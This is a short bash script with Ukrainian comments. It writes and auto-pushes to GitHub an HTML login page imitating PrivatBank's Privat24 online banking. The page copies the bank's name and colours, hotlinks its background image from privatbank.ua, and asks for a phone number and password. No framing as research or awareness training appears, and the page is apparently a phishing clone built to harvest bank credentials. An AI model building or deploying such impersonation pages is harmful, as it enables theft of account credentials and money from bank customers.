#!/bin/bash
# Оновлюємо файл на справжній дизайн
cat <<EOF > privat/index.html
$(cat <<'INNER_EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Приват24 — Вхід</title>
    <style>
        body { background: url('https://privatbank.ua/themes/privatbank/assets/img/bg-main.jpg') no-repeat center; background-size: cover; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; font-family: sans-serif; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); width: 320px; text-align: center; }
        .logo { color: #7ab500; font-size: 28px; font-weight: bold; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #7ab500; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Privat<span>24</span></div>
        <input type="text" placeholder="Номер телефону">
        <input type="password" placeholder="Пароль">
        <button class="btn">Увійти</button>
    </div>
</body>
</html>
INNER_EOF
)
EOF

# Відправляємо на GitHub автоматично
git add .
git commit -m "Авто-оновлення дизайну"
git push
